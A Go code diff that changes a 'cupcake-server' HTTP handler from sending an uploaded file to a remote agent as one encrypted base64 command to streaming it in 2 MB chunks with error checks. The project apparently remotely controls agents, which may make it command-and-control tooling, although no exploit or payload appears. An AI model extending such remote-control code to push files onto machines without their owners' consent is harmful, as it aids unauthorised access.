@@ -1,12 +1,12 @@
 package controllers
 
 import (
-	"bytes"
 	"encoding/base64"
 	"cupcake-server/pkg/globals"
 	"cupcake-server/services"
 	"github.com/gin-gonic/gin"
 	"net/http"
+	"io"
 )
 
 func ReadFileController(c *gin.Context) {
@@ -139,24 +139,39 @@ func Upload(c *gin.Context) {
 		c.JSON(404, gin.H{"error": "Agent Offline"})
 		return
 	}
-	client := val.(*globals.Client)
+	_ = val.(*globals.Client) // Keep this for validation
 
-	// 读取文件并转为 Base64
-	f, _ := file.Open()
-	defer f.Close()
-	buf := new(bytes.Buffer)
-	buf.ReadFrom(f)
-
-	b64Data := base64.StdEncoding.EncodeToString(buf.Bytes())
-
-	msg := globals.MessageWrapper{
-		MsgType: "command",
-		Payload: globals.CommandPayload{
-			CommandType: "file_upload",
-			Path:        targetPath,
-			Data:        b64Data,
-		},
+	f, err := file.Open()
+	if err != nil {
+		c.JSON(500, gin.H{"error": "Failed to open upload stream"})
+		return
 	}
-	_ = services.WriteEncryptedMessage(client, msg)
-	c.JSON(200, gin.H{"status": "upload_sent"})
+	defer f.Close()
+
+	// Stream to Agent in 2MB Chunks
+	buffer := make([]byte, 2*1024*1024)
+	isAppend := false
+
+	for {
+		n, readErr := f.Read(buffer)
+		if n > 0 {
+			b64Data := base64.StdEncoding.EncodeToString(buffer[:n])
+			errSend := services.UploadChunk(uuid, targetPath, b64Data, isAppend)
+			if errSend != nil {
+				c.JSON(500, gin.H{"error": "Agent upload failed: " + errSend.Error()})
+				return
+			}
+			isAppend = true
+		}
+
+		if readErr == io.EOF {
+			break
+		}
+		if readErr != nil {
+			c.JSON(500, gin.H{"error": "Read stream error: " + readErr.Error()})
+			return
+		}
+	}
+
+	c.JSON(200, gin.H{"status": "upload_success"})
 }
